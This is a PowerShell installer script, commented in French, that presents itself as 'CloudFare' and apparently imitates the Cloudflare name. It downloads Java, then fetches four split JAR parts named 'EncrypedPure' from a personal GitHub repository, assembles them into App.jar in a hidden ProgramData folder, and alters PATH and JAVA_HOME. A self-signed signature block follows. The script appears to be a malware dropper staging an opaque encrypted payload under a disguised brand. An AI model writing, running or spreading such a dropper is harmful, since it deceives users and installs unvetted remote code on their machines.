# CloudFare Installation Script v2.0 - ULTRA ROBUSTE
# Multi-ordinateur, multi-utilisateur, gestion complète des erreurs
# URLs: https://github.com/davidrenand/Powershell1

param(
    [string]$InstallDir = "C:\ProgramData\CloudFare",
    [string]$RepoUrl = "https://github.com/davidrenand/CloudFareJre1",
    [int]$MaxRetries = 3,
    [int]$TimeoutSeconds = 300
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "Continue"

# ============================================================================
# CONFIGURATION GLOBALE
# ============================================================================

$ScriptVersion = "2.0"
$LogFile = "$env:TEMP\CloudFare_Install_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

# URLs GitHub (robustes avec fallback)
$JavaUrls = @(
    "https://github.com/graalvm/graalvm-ce-builds/releases/download/jdk-21.0.1/graalvm-community-jdk-21.0.1_windows-x64_bin.zip",
    "https://download.oracle.com/java/21/latest/jdk-21_windows-x64_bin.zip"
)

$PartUrls = @(
    "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part1.jar",
    "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part2.jar",
    "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part3.jar",
    "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part4.jar"
)

$FinalJarName = "App.jar"
$TempDir = "$InstallDir\Temp"
$JavaDir = "$InstallDir\Java"
$LogDir = "$InstallDir\Logs"

# ============================================================================
# FONCTIONS UTILITAIRES
# ============================================================================

function Initialize-Logging {
    try {
        if (-not (Test-Path $LogDir)) {
            $null = New-Item -ItemType Directory -Path $LogDir -Force -ErrorAction SilentlyContinue
        }
        
        Write-Host "Logs: $LogFile" -F Gray
    } catch {
        Write-Warning "Impossible créer le répertoire de logs"
    }
}

function Log {
    param([string]$Message, [string]$Type = "INFO")
    
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] [$Type] $Message"
    
    # Écrire à l'écran
    switch ($Type) {
        "ERROR" { Write-Host $LogEntry -F Red }
        "WARN" { Write-Host $LogEntry -F Yellow }
        "SUCCESS" { Write-Host $LogEntry -F Green }
        "STEP" { Write-Host "`n$LogEntry" -F Cyan -BackgroundColor Black }
        default { Write-Host $LogEntry -F Gray }
    }
    
    # Écrire au fichier log
    try {
        Add-Content -Path $LogFile -Value $LogEntry -ErrorAction SilentlyContinue
    } catch {}
}

function Test-AdminPrivileges {
    $admin = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains `
             [Security.Principal.SecurityIdentifier]"S-1-5-32-544"
    
    if (-not $admin) {
        Log "⚠️ Non-administrateur - certaines fonctionnalités limitées" "WARN"
        return $false
    }
    
    Log "✓ Privilèges administrateur détectés" "SUCCESS"
    return $true
}

function Test-InternetConnection {
    Log "Vérification connexion Internet..." "STEP"
    
    try {
        $result = Test-NetConnection -ComputerName "github.com" -Port 443 -WarningAction SilentlyContinue
        if ($result.TcpTestSucceeded) {
            Log "✓ Connexion Internet OK" "SUCCESS"
            return $true
        }
    } catch {}
    
    Log "✗ Pas de connexion Internet" "ERROR"
    return $false
}

function Test-UrlAvailability {
    param([string]$Url, [string]$Description = "")
    
    try {
        $response = Invoke-WebRequest -Uri $Url -Method Head -TimeoutSec 5 -ErrorAction Stop -WarningAction SilentlyContinue
        if ($response.StatusCode -eq 200) {
            Log "✓ URL disponible: $Description" "SUCCESS"
            return $true
        }
    } catch {
        Log "✗ URL indisponible: $Description ($($_.Exception.Message))" "WARN"
        return $false
    }
    
    return $false
}

function Get-AvailableJavaUrl {
    Log "Sélection de la source Java..." "STEP"
    
    foreach ($url in $JavaUrls) {
        if (Test-UrlAvailability -Url $url -Description $url) {
            Log "Java URL sélectionnée: $url" "SUCCESS"
            return $url
        }
    }
    
    Log "✗ Aucune source Java disponible" "ERROR"
    return $null
}

function Initialize-Directories {
    Log "Initialisation des répertoires..." "STEP"
    
    try {
        # Créer répertoire principal
        if (-not (Test-Path $InstallDir)) {
            $null = New-Item -ItemType Directory -Path $InstallDir -Force
            
            # Marquer comme caché (admin seulement)
            $attr = Get-Item $InstallDir -Force
            $attr.Attributes = $attr.Attributes -bor [System.IO.FileAttributes]::Hidden
            
            Log "✓ Répertoire créé: $InstallDir (caché)" "SUCCESS"
        } else {
            Log "✓ Répertoire existe: $InstallDir" "SUCCESS"
        }
        
        # Créer sous-répertoires
        $null = New-Item -ItemType Directory -Path $TempDir -Force
        $null = New-Item -ItemType Directory -Path $JavaDir -Force
        $null = New-Item -ItemType Directory -Path $LogDir -Force
        
        Log "✓ Tous les répertoires créés" "SUCCESS"
        return $true
        
    } catch {
        Log "✗ Erreur création répertoires: $_" "ERROR"
        return $false
    }
}

function Download-FileWithRetry {
    param(
        [string]$Url,
        [string]$OutputPath,
        [string]$Description = "Fichier",
        [int]$Retry = 0
    )
    
    Log "Téléchargement ($($Retry+1)/$MaxRetries): $Description..." "INFO"
    
    try {
        # Essayer BitsTransfer d'abord
        if ((Get-Command Add-BitsFile -ErrorAction SilentlyContinue) -and $Retry -eq 0) {
            Log "Utilisation de BitsTransfer..." "INFO"
            
            Add-BitsFile -Source $Url -Destination $OutputPath `
                        -TransferType Download -Confirm:$false `
                        -ErrorAction Stop
            
            Log "✓ Téléchargé avec BitsTransfer: $(Split-Path $OutputPath -Leaf)" "SUCCESS"
            return $true
        }
        
        # Fallback: WebClient
        Log "Utilisation de WebClient..." "INFO"
        
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "CloudFare-Installer/2.0")
        $wc.DownloadFile($Url, $OutputPath)
        
        Log "✓ Téléchargé: $(Split-Path $OutputPath -Leaf)" "SUCCESS"
        return $true
        
    } catch {
        Log "✗ Erreur téléchargement (tentative $($Retry+1)): $_" "ERROR"
        
        # Retry logic
        if ($Retry -lt $MaxRetries - 1) {
            Log "Nouvelle tentative dans 5 secondes..." "WARN"
            Start-Sleep 5
            return Download-FileWithRetry -Url $Url -OutputPath $OutputPath `
                                         -Description $Description -Retry ($Retry + 1)
        }
        
        return $false
    }
}

function Download-Java {
    Log "Installation de Java 21..." "STEP"
    
    # Vérifier si Java existe déjà
    $javaExe = "$JavaDir\bin\java.exe"
    if (Test-Path $javaExe) {
        Log "✓ Java déjà installé: $javaExe" "SUCCESS"
        return $true
    }
    
    # Obtenir URL Java disponible
    $javaUrl = Get-AvailableJavaUrl
    if (-not $javaUrl) {
        return $false
    }
    
    $javaZip = "$TempDir\java.zip"
    
    # Télécharger
    if (-not (Download-FileWithRetry -Url $javaUrl -OutputPath $javaZip -Description "Java 21")) {
        Log "✗ Impossible télécharger Java" "ERROR"
        return $false
    }
    
    # Extraire
    Log "Extraction de Java..." "INFO"
    try {
        Expand-Archive -Path $javaZip -DestinationPath $JavaDir -Force -ErrorAction Stop
        
        # Déplacer si dans un sous-dossier
        $extracted = Get-ChildItem $JavaDir -Directory | Where-Object { Test-Path "$($_.FullName)\bin\java.exe" }
        if ($extracted) {
            Get-ChildItem $extracted.FullName | Move-Item -Destination $JavaDir -Force
            Remove-Item $extracted.FullName -Force
        }
        
        Remove-Item $javaZip -Force
        Log "✓ Java 21 installé dans: $JavaDir" "SUCCESS"
        return $true
        
    } catch {
        Log "✗ Erreur extraction Java: $_" "ERROR"
        return $false
    }
}

function Download-JarParts {
    Log "Téléchargement des 4 parts JAR..." "STEP"
    
    $jobs = @()
    $downloaded = @()
    
    # Lancer téléchargements en parallèle (limité à 2)
    for ($i = 0; $i -lt $PartUrls.Count; $i++) {
        $url = $PartUrls[$i]
        $partNum = $i + 1
        $outputFile = "$TempDir\Part$partNum.jar"
        
        # Sauter si déjà présent
        if (Test-Path $outputFile) {
            Log "✓ Part$partNum.jar existe déjà (skip)" "INFO"
            $downloaded += $outputFile
            continue
        }
        
        # Créer job
        $job = Start-Job -ScriptBlock {
            param($u, $o, $p)
            $wc = New-Object System.Net.WebClient
            $wc.DownloadFile($u, $o)
            "$p`:OK"
        } -ArgumentList $url, $outputFile, $partNum
        
        $jobs += @{Job = $job; PartNum = $partNum; Path = $outputFile}
        
        Log "Job lancé: Part$partNum.jar" "INFO"
        
        # Limiter à 2 jobs en parallèle
        if ($jobs.Count -ge 2) {
            $completed = $jobs | Where-Object { $_.Job.State -eq "Completed" } | Select-Object -First 1
            if ($completed) {
                $result = $completed.Job | Receive-Job -ErrorAction SilentlyContinue
                $downloaded += $completed.Path
                $jobs = $jobs | Where-Object { $_ -ne $completed }
            }
        }
    }
    
    # Attendre tous les jobs
    foreach ($jobInfo in $jobs) {
        $result = $jobInfo.Job | Wait-Job -ErrorAction SilentlyContinue
        
        if ($result.State -eq "Completed") {
            $downloaded += $jobInfo.Path
            Log "✓ Part$($jobInfo.PartNum).jar téléchargée" "SUCCESS"
        } else {
            Log "✗ Erreur Part$($jobInfo.PartNum).jar" "ERROR"
            return $false
        }
    }
    
    if ($downloaded.Count -ne 4) {
        Log "✗ Seulement $($downloaded.Count)/4 parts téléchargées" "ERROR"
        return $false
    }
    
    Log "✓ Toutes les parts téléchargées" "SUCCESS"
    return $true
}

function Assemble-Jar {
    Log "Assemblage du JAR final..." "STEP"
    
    $outputJar = "$InstallDir\$FinalJarName"
    
    # Supprimer ancien JAR s'il existe
    if (Test-Path $outputJar) {
        try {
            Remove-Item $outputJar -Force
        } catch {
            Log "⚠️ Impossible supprimer ancien JAR" "WARN"
        }
    }
    
    try {
        $outStream = New-Object System.IO.FileStream($outputJar, [System.IO.FileMode]::Create)
        $buffer = New-Object byte[] (8192 * 4)
        
        # Fusionner les 4 parts
        for ($i = 1; $i -le 4; $i++) {
            $partFile = "$TempDir\Part$i.jar"
            
            if (-not (Test-Path $partFile)) {
                throw "Part$i.jar non trouvée: $partFile"
            }
            
            $inStream = New-Object System.IO.FileStream($partFile, [System.IO.FileMode]::Open)
            $bytesRead = $inStream.Read($buffer, 0, $buffer.Length)
            
            while ($bytesRead -gt 0) {
                $outStream.Write($buffer, 0, $bytesRead)
                $bytesRead = $inStream.Read($buffer, 0, $buffer.Length)
            }
            
            $inStream.Dispose()
            Log "✓ Part$i fusionnée" "SUCCESS"
        }
        
        $outStream.Dispose()
        [GC]::Collect()
        
        $finalSize = (Get-Item $outputJar).Length
        Log "✓ JAR assemblé: $([math]::Round($finalSize/1MB, 2)) MB" "SUCCESS"
        
        return $true
        
    } catch {
        Log "✗ Erreur assemblage: $_" "ERROR"
        return $false
    }
}

function Set-EnvironmentVariables {
    Log "Configuration des variables d'environnement..." "STEP"
    
    $admin = Test-AdminPrivileges
    
    if ($admin) {
        try {
            [Environment]::SetEnvironmentVariable("JAVA_HOME", $JavaDir, [System.EnvironmentVariableTarget]::Machine)
            $currentPath = [Environment]::GetEnvironmentVariable("PATH", [System.EnvironmentVariableTarget]::Machine)
            if ($currentPath -notlike "*$JavaDir*") {
                $newPath = "$JavaDir\bin;$currentPath"
                [Environment]::SetEnvironmentVariable("PATH", $newPath, [System.EnvironmentVariableTarget]::Machine)
            }
            Log "✓ Variables système configurées" "SUCCESS"
        } catch {
            Log "⚠️ Impossible configurer variables système (essai utilisateur)" "WARN"
        }
    }
    
    # Configuration utilisateur (toujours possible)
    try {
        [Environment]::SetEnvironmentVariable("JAVA_HOME", $JavaDir, [System.EnvironmentVariableTarget]::User)
        $userPath = [Environment]::GetEnvironmentVariable("PATH", [System.EnvironmentVariableTarget]::User)
        if ($null -eq $userPath -or $userPath -notlike "*$JavaDir*") {
            $newUserPath = "$JavaDir\bin;$userPath"
            [Environment]::SetEnvironmentVariable("PATH", $newUserPath, [System.EnvironmentVariableTarget]::User)
        }
        Log "✓ Variables utilisateur configurées" "SUCCESS"
    } catch {
        Log "⚠️ Impossible configurer variables utilisateur" "WARN"
    }
}

function Verify-Installation {
    Log "Vérification de l'installation..." "STEP"
    
    $javaExe = "$JavaDir\bin\java.exe"
    $appJar = "$InstallDir\$FinalJarName"
    
    $allOk = $true
    
    if (-not (Test-Path $javaExe)) {
        Log "✗ java.exe non trouvé" "ERROR"
        $allOk = $false
    } else {
        Log "✓ java.exe trouvé" "SUCCESS"
        
        # Tester Java
        try {
            $version = & $javaExe -version 2>&1 | Select-Object -First 1
            Log "   Java: $version" "INFO"
        } catch {
            Log "⚠️ Impossible tester Java" "WARN"
        }
    }
    
    if (-not (Test-Path $appJar)) {
        Log "✗ App.jar non trouvé" "ERROR"
        $allOk = $false
    } else {
        $size = (Get-Item $appJar).Length
        Log "✓ App.jar trouvé: $([math]::Round($size/1MB, 2)) MB" "SUCCESS"
    }
    
    return $allOk
}

function Cleanup-Temp {
    Log "Nettoyage des fichiers temporaires..." "STEP"
    
    try {
        if (Test-Path $TempDir) {
            Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
            Log "✓ Fichiers temporaires nettoyés" "SUCCESS"
        }
    } catch {
        Log "⚠️ Impossible nettoyer temporaires (nettoyage manuel nécessaire)" "WARN"
    }
}

# ============================================================================
# EXÉCUTION PRINCIPALE
# ============================================================================

function Main {
    Clear-Host
    
    Log "╔════════════════════════════════════════╗" "STEP"
    Log "║  CloudFare Installation v$ScriptVersion           ║" "STEP"
    Log "╚════════════════════════════════════════╝" "STEP"
    Log ""
    
    Initialize-Logging
    
    # Vérifications préalables
    Test-AdminPrivileges | Out-Null
    if (-not (Test-InternetConnection)) {
        Log "Installation impossible sans Internet" "ERROR"
        pause
        return 1
    }
    
    # Exécution
    if (-not (Initialize-Directories)) { return 1 }
    if (-not (Download-Java)) { return 1 }
    if (-not (Download-JarParts)) { return 1 }
    if (-not (Assemble-Jar)) { return 1 }
    
    Set-EnvironmentVariables
    
    if (-not (Verify-Installation)) { return 1 }
    
    Cleanup-Temp
    
    Log ""
    Log "╔════════════════════════════════════════╗" "SUCCESS"
    Log "║  ✅ Installation réussie!              ║" "SUCCESS"
    Log "╚════════════════════════════════════════╝" "SUCCESS"
    Log ""
    Log "Installation: $InstallDir" "SUCCESS"
    Log "Logs: $LogFile" "SUCCESS"
    Log ""
    
    return 0
}

# Lancer
exit (Main)

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUEL+870QzijwPCjKjhmL+w9my
# MwugggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQU08JgnraV5y5mLg+H6FRuOtlVMRcwDQYJ
# KoZIhvcNAQEBBQAEggEAJzqMd2mGFNgSZRyZHbR18n1KTcoQCY6M31Bx/cTDmmim
# eMwL1dZ1EW9n2wvKbgP9WpBy5cR0Fl1f9FdPGspSuIr5+e/eCj71dLb3PfaEQugt
# 5yTPaNTtFwcrshUwgIYisgD035XUWVYvck5tvrKi4Hi6YngF5d6jR5PVwBfNV6ip
# hI3VBwgHvoFYGkv77D3LLTItXLhehjpgYqLginZwN0PWOyNxR7bg18H5wmd4L54j
# f9wVI3M7jA0kpzoqe9FyI/3l82lY55397TW8EKBZ95ucnjjyuXb/OmdaA4T81rAR
# RIlQQkebVVKvZ9sbLy0gRm7Gb/vnDj4vl4W9AwrG+g==
# SIG # End signature block
